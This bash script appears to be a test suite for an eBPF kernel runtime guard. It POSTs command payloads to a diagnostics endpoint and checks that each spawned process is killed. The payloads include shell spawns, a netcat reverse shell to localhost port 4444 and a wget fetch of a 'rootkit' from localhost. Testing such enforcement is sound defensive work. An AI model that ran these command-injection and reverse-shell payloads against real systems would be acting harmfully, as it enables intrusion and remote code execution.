#!/usr/bin/env bash

TARGET_HOST="${1:-http://localhost:8080}"

COLOR_RESET="\033[0m"
COLOR_GREEN="\033[1;32m"
COLOR_RED="\033[1;31m"
COLOR_YELLOW="\033[1;33m"
COLOR_CYAN="\033[1;36m"
COLOR_BOLD="\033[1m"

TEMP_RESP_FILE="/tmp/test_exec_resp.json"

TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

echo -e "${COLOR_CYAN}${COLOR_BOLD}========================================================================${COLOR_RESET}"
echo -e "${COLOR_CYAN}${COLOR_BOLD}   eBPF Kernel Runtime Guard: Execution & Enforcement Test Suite        ${COLOR_RESET}"
echo -e "${COLOR_CYAN}${COLOR_BOLD}   Target Workload URL: ${TARGET_HOST}                                  ${COLOR_RESET}"
echo -e "${COLOR_CYAN}${COLOR_BOLD}========================================================================${COLOR_RESET}\n"

run_benign_get_test() {
    local test_name="$1"
    local endpoint="$2"
    local expected_status="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    echo -e "${COLOR_YELLOW}[TEST ${TOTAL_TESTS}] Benign Request: GET ${endpoint}${COLOR_RESET}"
    
    http_code=$(curl -s -o "$TEMP_RESP_FILE" -w "%{http_code}" "${TARGET_HOST}${endpoint}")
    
    if [ "$http_code" -eq "$expected_status" ]; then
        echo -e "       ${COLOR_GREEN}[PASS] Received HTTP ${http_code} OK (Expected: ${expected_status})${COLOR_RESET}"
        cat "$TEMP_RESP_FILE" | python3 -m json.tool | sed 's/^/       /'
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "       ${COLOR_RED}[FAIL] Received HTTP ${http_code} (Expected: ${expected_status})${COLOR_RESET}"
        cat "$TEMP_RESP_FILE" 2>/dev/null | sed 's/^/       /'
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
    echo ""
}

run_exploit_exec_test() {
    local test_name="$1"
    local cmd_payload="$2"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    echo -e "${COLOR_YELLOW}[TEST ${TOTAL_TESTS}] Exploit Payload: POST /api/v1/diagnostics cmd='${cmd_payload}'${COLOR_RESET}"
    
    http_code=$(curl -s -o "$TEMP_RESP_FILE" -w "%{http_code}" \
        -X POST "${TARGET_HOST}/api/v1/diagnostics" \
        -H "Content-Type: application/json" \
        -d "{\"cmd\": \"${cmd_payload}\"}")
    
    if [ "$http_code" -ne 200 ]; then
        echo -e "       ${COLOR_RED}[FAIL] Unexpected HTTP status: ${http_code}${COLOR_RESET}"
        cat "$TEMP_RESP_FILE" 2>/dev/null | sed 's/^/       /'
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo ""
        return
    fi
    
    is_enforced=$(python3 -c "import json; d=json.load(open('$TEMP_RESP_FILE')); print(d.get('enforced_by_kernel', False))" 2>/dev/null)
    return_code=$(python3 -c "import json; d=json.load(open('$TEMP_RESP_FILE')); print(d.get('returncode', 0))" 2>/dev/null)
    exec_binary=$(python3 -c "import json; d=json.load(open('$TEMP_RESP_FILE')); print(d.get('executed_binary', 'unknown'))" 2>/dev/null)
    
    if [ "$is_enforced" = "True" ] || [ "$return_code" -eq -9 ] || [ "$return_code" -eq 137 ]; then
        echo -e "       ${COLOR_GREEN}[PASS: INTERCEPTED] Kernel eBPF Sigkill Enforced!${COLOR_RESET}"
        echo -e "       Target Binary   : ${COLOR_CYAN}${exec_binary}${COLOR_RESET}"
        echo -e "       Process Exit Code: ${COLOR_RED}${return_code} (SIGKILL / Signal 9)${COLOR_RESET}"
        echo -e "       Enforcement Flag: ${COLOR_GREEN}enforced_by_kernel=True${COLOR_RESET}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "       ${COLOR_RED}[FAIL: UNENFORCED] Process executed without kernel SIGKILL!${COLOR_RESET}"
        echo -e "       Return Code: ${return_code}"
        cat "$TEMP_RESP_FILE" | python3 -m json.tool | sed 's/^/       /'
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
    echo ""
}

run_benign_get_test "Service Health Check" "/api/v1/health" 200
run_benign_get_test "Multi-Tenant Data Retrieval" "/api/v1/tenants" 200

run_exploit_exec_test "Direct Dash Execution" "/bin/dash"
run_exploit_exec_test "System Shell Symlink Execution" "/bin/sh"
run_exploit_exec_test "Reverse Shell Spawn via Netcat" "/usr/bin/nc 127.0.0.1 4444"
run_exploit_exec_test "Malicious Binary Download via Wget" "/usr/bin/wget http://127.0.0.1:9999/rootkit"

rm -f "$TEMP_RESP_FILE"

echo -e "${COLOR_CYAN}${COLOR_BOLD}========================================================================${COLOR_RESET}"
echo -e "${COLOR_CYAN}${COLOR_BOLD}   Test Suite Summary:                                                  ${COLOR_RESET}"
echo -e "   Total Tests Executed : ${TOTAL_TESTS}"
echo -e "   Tests Passed         : ${COLOR_GREEN}${PASSED_TESTS}${COLOR_RESET}"
echo -e "   Tests Failed         : ${COLOR_RED}${FAILED_TESTS}${COLOR_RESET}"
echo -e "${COLOR_CYAN}${COLOR_BOLD}========================================================================${COLOR_RESET}"

if [ "$FAILED_TESTS" -eq 0 ]; then
    echo -e "${COLOR_GREEN}${COLOR_BOLD}ALL EXECUTION & ENFORCEMENT TESTS PASSED PERFECTLY.${COLOR_RESET}\n"
    exit 0
else
    echo -e "${COLOR_RED}${COLOR_BOLD}FAILURES DETECTED IN TEST SUITE.${COLOR_RESET}\n"
    exit 1
fi
